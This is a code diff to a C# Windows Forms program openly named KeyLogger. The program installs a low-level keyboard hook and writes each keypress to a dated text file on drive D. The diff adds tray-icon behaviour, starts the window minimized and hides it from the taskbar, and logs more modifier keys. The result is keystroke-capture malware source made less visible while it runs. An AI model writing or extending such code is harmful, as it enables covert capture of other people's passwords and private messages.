@@ -17,8 +17,46 @@ namespace KeyLogger
         public Form1()
         {
             InitializeComponent();
+            
             Load += Form1_Load;
             FormClosing += Form1_FormClosing;
+            notifyIconMainForm.Click += NotifyIconMainForm_Click;
+            notifyIconMainForm.DoubleClick += NotifyIconMainForm_DoubleClick;
+            SetSetingsNotifyIcon();
+            this.Resize += Form1_Resize;
+            
+        }
+
+        private void Form1_Resize(object sender, EventArgs e)
+        {
+            if (this.WindowState == FormWindowState.Minimized)
+            {
+                this.ShowInTaskbar = false;
+                this.Hide();
+                notifyIconMainForm.BalloonTipTitle = "Программа была спрятана";
+                notifyIconMainForm.BalloonTipText = "Обратите внимание что программа была спрятана в трей и продолжит свою работу.";
+                notifyIconMainForm.ShowBalloonTip(5000);
+            }
+
+        }
+
+        private void SetSetingsNotifyIcon()
+        {
+            notifyIconMainForm.BalloonTipIcon = ToolTipIcon.Info;
+            notifyIconMainForm.BalloonTipTitle = "KeyLogger";
+            notifyIconMainForm.BalloonTipText = "One ckick - open NotifyIcon\nDouble click - close NotifyIcon";
+            notifyIconMainForm.ShowBalloonTip(50000);
+        }
+
+        private void NotifyIconMainForm_DoubleClick(object sender, EventArgs e)
+        {
+            this.Close();
+        }
+
+        private void NotifyIconMainForm_Click(object sender, EventArgs e)
+        {
+            this.Show();
+            this.WindowState = FormWindowState.Normal;
         }
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
@@ -59,7 +97,7 @@ namespace KeyLogger
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 string dt = $"{DateTime.Now.ToShortDateString()}";
-                string fileName = $"D:\\some_{dt}.txt";
+                string fileName = $"D:\\KeyPress_{dt}.txt";
                 if (!File.Exists(fileName))
                 {
                     using (FileStream fs = File.Create(fileName)) { };
@@ -69,31 +107,31 @@ namespace KeyLogger
                     switch (vkCode.ToString())
                     {
                         case "8":
-                            sw.Write("Backspace");
+                            sw.Write("BACKSPACE");
                             break;
                         case "9":
-                            sw.Write("Tab");
+                            sw.Write("TAB");
                             break;
                         case "13":
-                            sw.Write("Enter");
+                            sw.Write("ENTER");
                             break;
                         case "16":
-                            sw.Write("Shift");
+                            sw.Write("SHIFT");
                             break;
                         case "17":
                             sw.Write("CTRL");
                             break;
                         case "18":
-                            sw.Write("Alt");
+                            sw.Write("ALT");
                             break;
                         case "20":
-                            sw.Write("CapsLock");
+                            sw.Write("CAPSLOCK");
                             break;
                         case "32":
                             sw.Write(" ");
                             break;
                         case "46":
-                            sw.Write("Delete");
+                            sw.Write("DELETE");
                             break;
 
                         case "65":
@@ -254,6 +292,25 @@ namespace KeyLogger
                             sw.Write("/");
                             break;
 
+                        case "160":
+                            sw.Write("LEFTSHIFT");
+                            break;
+                        case "161":
+                            sw.Write("RIGHTSHIFT");
+                            break;
+                        case "162":
+                            sw.Write("LEFTCTRL");
+                            break;
+                        case "163":
+                            sw.Write("RIGHTCTRL");
+                            break;
+                        case "164":
+                            sw.Write("LEFTALT");
+                            break;
+                        case "165":
+                            sw.Write("RIGHTALT");
+                            break;
+
                         case "192":
                             sw.Write("`");
                             break;
@@ -315,6 +372,9 @@ namespace KeyLogger
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            //this.ShowInTaskbar = false;
+            this.WindowState = FormWindowState.Minimized;
+            //this.Hide();
             SetHook();
         }
 
